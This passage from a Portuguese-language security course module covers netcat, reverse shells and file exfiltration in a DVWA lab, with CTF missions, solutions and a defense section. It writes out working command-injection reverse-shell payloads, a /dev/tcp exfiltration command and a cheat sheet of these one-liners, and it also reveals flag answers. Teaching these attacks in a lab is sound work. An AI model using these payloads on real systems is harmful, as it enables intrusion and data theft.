+**Seu objetivo:** abrir um reverse shell que volte ao seu Kali, e dentro dele descobrir **com que usuário** o web roda e **qual o codinome da distribuição** do alvo (o campo `VERSION_CODENAME` de `/etc/os-release`). A flag é `FLAG{usuario-codinome}`.
+
+O caminho tem duas pontas que você já viu na seção 3: um listener no Kali, e um payload de reverse shell injetado no campo de ping. Pense em qual one-liner faz o alvo conectar de volta — e lembre do aviso sobre `/dev/tcp` e o `sh`.
+
+<Hint title="Dica 1 — o listener e o endereço de volta">
+No Kali, suba o listener antes de injetar nada: `nc -lvnp 4444`. O reverse shell vai conectar no IP da sua `eth1` (a da `lab_net`, seção 5.1), não em `127.0.0.1` — o alvo é outra máquina.
+</Hint>
+
+<Hint title="Dica 2 — o payload, e o bash">
+O alvo tem `bash`, mas a injeção roda sob `sh`. Então o payload precisa chamar o bash de propósito: algo como `; bash -c "bash -i >& /dev/tcp/SEU_IP/4444 0>&1"`. Troque `SEU_IP` pelo IP da sua `eth1`. Depois de enviar, a página fica "pensando" — é o shell segurando a conexão. Olhe o seu listener.
+</Hint>
+
+<Solution title="Solução">
+No Kali, o listener:
+
+```console
+$ nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+No campo **ping** da página Command Injection (Security = low), injete:
+
+```text
+127.0.0.1; bash -c "bash -i >& /dev/tcp/10.0.0.2/4444 0>&1"
+```
+
+(trocando `10.0.0.2` pelo IP da sua `eth1`). No listener, o shell abre:
+
+```console
+connect to [10.0.0.2] from (UNKNOWN) [10.0.0.3] 40112
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@dvwa:/var/www/html/vulnerabilities/exec$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@dvwa:/var/www/html/vulnerabilities/exec$ hostname
+dvwa
+www-data@dvwa:/var/www/html/vulnerabilities/exec$ grep VERSION_CODENAME /etc/os-release
+VERSION_CODENAME=trixie
+```
+
+O usuário é `www-data` e o codinome é `trixie`. A flag se monta com esses dois valores.
+</Solution>
+
+<FlagInput task="missao-2-de-rce-a-shell" />
+
+**Antes de seguir, conserte o shell.** Repare na mensagem `no job control`: você está num dumb shell (seção 2.4). Faça o upgrade com o `script`, que existe no alvo (o `python3` não existe):
+
+```console
+www-data@dvwa:/var/www/html/vulnerabilities/exec$ tty
+not a tty
+www-data@dvwa:/var/www/html/vulnerabilities/exec$ script -qc /bin/bash /dev/null
+www-data@dvwa:/var/www/html/vulnerabilities/exec$ tty
+/dev/pts/0
+```
+
+Antes, `tty` respondia `not a tty`; depois do `script`, você tem um `/dev/pts/0` — um PTY de verdade. Agora o shell se comporta muito melhor.
+
+### 5.4 Missão 3 — a exfiltração provada (desafio)
+
+Com o shell na mão, o passo clássico seguinte é **tirar arquivos do alvo**. Seu objetivo: transferir `/var/www/html/favicon.ico` do DVWA para o seu Kali e **provar**, pelo SHA-256, que ele chegou inteiro. A flag é `FLAG{favicon-hash8}`, com os 8 primeiros caracteres do SHA-256 do arquivo recebido.
+
+O desafio: o alvo **não tem netcat**. Você tem, no Kali. Então monte o canal com uma ponta de `nc` (recebendo) e a outra ponta falando por `/dev/tcp` (enviando) — a mesma ideia da seção 3.3, adaptada ao que o alvo tem.
+
+<Hint title="Dica 1 — quem recebe">
+No Kali, um listener que **grava num arquivo** em vez de mostrar na tela: `nc -lvnp 4445 > loot_favicon.ico`. Deixe-o rodando e use o shell (ou uma nova injeção) para enviar.
+</Hint>
+
+<Hint title="Dica 2 — quem envia, sem nc">
+No alvo, mande o conteúdo do arquivo para o seu Kali pela mesma mágica do `/dev/tcp`, lembrando do `bash -c`: `cat /var/www/html/favicon.ico > /dev/tcp/SEU_IP/4445`. Quando terminar, o listener fecha e grava. Confira o tamanho (deve ser 1406 bytes) e o SHA-256.
+</Hint>
+
+<Solution title="Solução">
+No Kali, o listener que grava:
+
+```console
+$ nc -lvnp 4445 > loot_favicon.ico
+listening on [any] 4445 ...
+connect to [10.0.0.2] from (UNKNOWN) [10.0.0.3] 40990
+```
+
+Dispare o envio pelo campo de ping (ou pelo shell), sempre dentro de um `bash -c`:
+
+```text
+127.0.0.1; bash -c "cat /var/www/html/favicon.ico > /dev/tcp/10.0.0.2/4445"
+```
+
+De volta ao Kali, confirme o tamanho e calcule o hash:
+
+```console
+$ ls -l loot_favicon.ico
+-rw-r--r-- 1 kali kali 1406 Oct  5 02:19 loot_favicon.ico
+$ sha256sum loot_favicon.ico
+f59153c29cc0ce81abb6fd1b2f1019b0b12da079d810b4ef282a78b70751d3a1  loot_favicon.ico
+```
+
+Os 8 primeiros caracteres do hash entram na flag.
+</Solution>
+
+<FlagInput task="missao-3-exfiltracao-provada" />
+
+### 5.5 Desligar o laboratório
+
+Terminou? No painel **Laboratório**, clique em **Parar** para liberar a vaga (regra de um lab por vez). Se quiser refazer as missões do zero, use **Resetar**, que recria o DVWA no estado de fábrica. No terminal, o equivalente é `scripts/lab.sh down dvwa`.
+
+## 6. Variações e aprofundamento
+
+**ncat: o netcat moderno, com TLS.** O projeto Nmap reescreveu o netcat como `ncat`, que fala as mesmas ideias com recursos novos. O mais importante para segurança é o `--ssl`: um reverse shell por `ncat --ssl` viaja **cifrado**, o que atrapalha quem monitora a rede com Wireshark ou IDS. Ele também tem `--exec`/`-e` e um modo *broker*. Onde há `ncat`, prefira-o.
+
+**socat: o canivete industrial.** O `socat` conecta "qualquer coisa a qualquer coisa" (sockets, arquivos, PTYs, TLS). Ele é a forma mais limpa de ganhar um **PTY completo direto**: com um lado `socat file:$(tty),raw,echo=0` e o outro `socat ... exec:/bin/bash,pty,stderr`, você recebe um shell praticamente idêntico a estar sentado na máquina — com `Ctrl-C`, `tab` e tudo. É mais pesado e nem sempre está instalado, mas é o padrão-ouro quando está.
+
+**Reverse shells sem bash e sem nc.** Como o alvo manda nas suas opções, vale conhecer o cardápio. O mesmo DVWA tem `perl` e `php`, e cada um tem seu one-liner de reverse shell clássico (um `perl` que abre um socket e liga a um `/bin/sh`; um `php` com `fsockopen`). Em alvos Windows, o caminho é o `powershell` com `System.Net.Sockets.TCPClient`. A lição não é decorar todos, e sim: **primeiro descubra o que o alvo tem** (`which bash perl python3 nc` ...) e escolha o payload a partir disso.
+
+**Shells estáveis e o próximo passo.** O reverse shell com netcat é frágil: se a conexão cai, acabou. Ferramentas como o Metasploit (Trilha 5) resolvem isso com *payloads* mais robustos (o Meterpreter), que reconectam, cifram e trazem um arsenal embutido. Entender o reverse shell cru deste módulo é o que faz o Meterpreter parar de ser mágica: por baixo, é a mesma ideia — o alvo conecta de volta a quem escuta.
+
+**Port knocking e canais escondidos.** Em cenários mais avançados, o shell não usa uma porta óbvia: pode sair pela 443 (misturado ao HTTPS legítimo), ser disparado por uma sequência de "batidas" em portas (*port knocking*) ou até trafegar por DNS. São formas de fugir do *egress filtering* da seção 8 — e por isso a defesa não pode confiar só em bloquear "a porta 4444".
+
+## 7. Erros comuns
+
+- **`nc: invalid option -- 'e'`** — você está num netcat **openbsd**, que removeu o `-e` (seção 2.1). Use o payload com `bash`/`/dev/tcp`, ou instale/chame o `ncat`.
+- **O reverse shell "não conecta".** Quase sempre é uma destas três: (1) o payload não chamou o `bash` e caiu no `sh`, que não tem `/dev/tcp` (envolva em `bash -c "..."`); (2) você apontou para `127.0.0.1` em vez do IP da sua `eth1` — do ponto de vista do alvo, `127.0.0.1` é ele mesmo; (3) o listener não estava de pé antes da injeção.
+- **O listener "conecta e fecha na hora".** Em transferências, isso é normal: quando o outro lado termina e fecha, a conexão acaba. Vira problema quando acontece **antes** de os dados chegarem — confira o tamanho do arquivo recebido contra o original.
+- **`Ctrl-C` matou meu shell inteiro.** Era um dumb shell sem PTY (seção 2.4). Faça o upgrade (`script -qc /bin/bash /dev/null`) antes de rodar qualquer coisa interativa.
+- **`Address already in use`** ao subir o listener — a porta ainda está presa por um `nc` anterior. Escolha outra porta ou encerre o processo antigo (`pkill nc`).
+- **A injeção não executa o segundo comando.** Confirme que o **DVWA Security** está em **low**; em níveis mais altos o campo filtra os separadores (`;`, `&`), e aí o jogo muda (tema das trilhas de web).
+
+## 8. Defesa e mitigação
+
+A cadeia que você montou tem várias camadas, e cada uma tem uma defesa. A regra é atacar a **causa raiz** primeiro e empilhar as outras como profundidade.
+
+**1. Elimine a injeção de comando (a causa raiz).** O shell só existiu porque a aplicação entregou entrada do usuário a um shell do sistema. O código vulnerável do DVWA faz, em essência:
+
+```php
+// VULNERÁVEL: concatena a entrada do usuário num comando de shell
+$target = $_REQUEST['ip'];
+$cmd = shell_exec('ping -c 4 ' . $target);
+```
+
+A correção de fundo é **não usar shell** e **validar por allowlist**. Se você só precisa de um IP, valide que é um IP antes de qualquer coisa e passe os argumentos sem shell:
+
+```php
+// SEGURO: valida o formato e não passa pela shell
+$target = $_REQUEST['ip'];
+if (!filter_var($target, FILTER_VALIDATE_IP)) {
+    http_response_code(400);
+    exit('IP inválido');
+}
+// executa sem shell, com o argumento separado (sem interpretação de ';', '|', '&')
+$out = [];
+exec('ping -c 4 ' . escapeshellarg($target), $out);
+```
+
+Dois princípios: **validação por allowlist** (aceite só o que casa com "é um IP", em vez de tentar bloquear caracteres ruins um a um) e **separar comando de dados** (APIs que recebem os argumentos como lista, ou ao menos `escapeshellarg`, para que `; id` vire um texto inofensivo, não um novo comando).
+
+**2. Corte a saída com egress filtering.** Mesmo que uma injeção escape, o reverse shell precisa **conectar de volta** ao atacante. Um firewall que controla a **saída** — <GlossaryTerm term="egress filtering">egress filtering</GlossaryTerm>, a prática de só permitir conexões de saída para destinos e portas previstos — derruba isso. Um servidor web legítimo quase nunca precisa **iniciar** conexões para a internet; negá-las por padrão mata o reverse shell (e a exfiltração) sem afetar o serviço. É a defesa que teria contido a fase "controle remoto" do caso Equifax.
+
+**3. Rode o serviço com o mínimo de privilégio.** No lab, o shell veio como `www-data`, não `root` — e isso limita o estrago (é o começo do assunto de escalação de privilégios, Trilha 6). Um serviço que não roda como administrador, num contêiner sem ferramentas sobrando (sem `nc`, sem compiladores), dá ao atacante um ponto de apoio muito mais pobre.
+
+**4. Detecte o que a prevenção deixou passar.** Alguns sinais valem alarme: um processo de shell (`bash`, `sh`) **filho do processo do servidor web** (o Apache não costuma gerar `bash -i`); conexões de **saída** partindo de contas de serviço; a criação de arquivos suspeitos no diretório web (os web shells do caso Equifax teriam sido pegos por *file integrity monitoring*, que a empresa não tinha ligado). Ferramentas de EDR, o `auditd` no Linux e a monitoração de rede (2.6) são onde esses sinais aparecem.
+
+## 9. Exercícios
+
+Responda ao quiz abaixo (ele conta para concluir o módulo) e refaça os desafios práticos pensando no "porquê" de cada passo.
+
+<Quiz task="quiz-final" />
+
+**Desafios práticos (as três flags da seção 5).** Além delas, para fixar: (a) repita a transferência da missão 3 com um arquivo maior (por exemplo `dvwa/images/login_logo.png`) e confirme o SHA-256 dos dois lados — observe se algum fecha a conexão cedo demais; (b) explique, em uma frase, por que apontar o reverse shell para `127.0.0.1` nunca funcionaria a partir do DVWA.
+
+<Solution title="Resposta do desafio (b)">
+Do ponto de vista do DVWA, `127.0.0.1` é **ele mesmo** (o loopback do próprio contêiner). O reverse shell precisa conectar à máquina do atacante, então o destino tem que ser o IP do Kali na `lab_net` (a `eth1`), não o loopback do alvo.
+</Solution>
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- O **netcat** move bytes entre o seu terminal e um socket TCP/UDP. Dessa simplicidade saem banner grabbing, transferência de arquivo, listeners e shells.
+- Uma **RCE** "de bilhete" (um comando por vez) vira poder de verdade quando você a transforma num **shell** interativo.
+- **Bind** × **reverse**: o que decide é quem inicia a conexão. O reverse shell vence porque firewalls liberam a saída e barram a entrada.
+- O primeiro shell é um **dumb shell** sem **PTY**: sem `Ctrl-C`, `tab` ou eco de senha. O upgrade (`script`, `python3 pty.spawn`, `socat`) conserta.
+- `/dev/tcp` é um recurso do **bash**, não do `sh`: por isso o payload chama o bash de propósito.
+- Transferiu um arquivo? Prove com **SHA-256** que chegou inteiro.
+- A defesa de fundo é eliminar a injeção (validação por allowlist, sem shell); em profundidade, **egress filtering**, mínimo privilégio e detecção.
+
+**Cola rápida:**
+
+```text
+nc -lvnp PORTA                 # listener (servidor)
+nc IP PORTA                    # cliente (conecta)
+nc -lvnp PORTA > arq           # recebe arquivo
+nc IP PORTA < arq              # envia arquivo
+# reverse shell no alvo (sem nc):
+bash -c "bash -i >& /dev/tcp/SEU_IP/PORTA 0>&1"
+# upgrade de PTY no alvo:
+script -qc /bin/bash /dev/null
+```
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [Netcat 1.10 — README original (Hobbit)](https://nc110.sourceforge.io/) — o texto que cunhou "canivete suíço do TCP/IP"; vale ler pela clareza.
+- [Apache Struts S2-045 (CVE-2017-5638)](https://struts.apache.org/docs/s2-045.html) — o aviso oficial da falha que abriu o caso Equifax.
+- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection) — a falha que, no lab, abriu a porta para o shell.
+- [GTFOBins](https://gtfobins.github.io/) — catálogo de binários comuns (como o `script` e o `perl`) e os truques que cada um permite, incluindo shells e transferência.
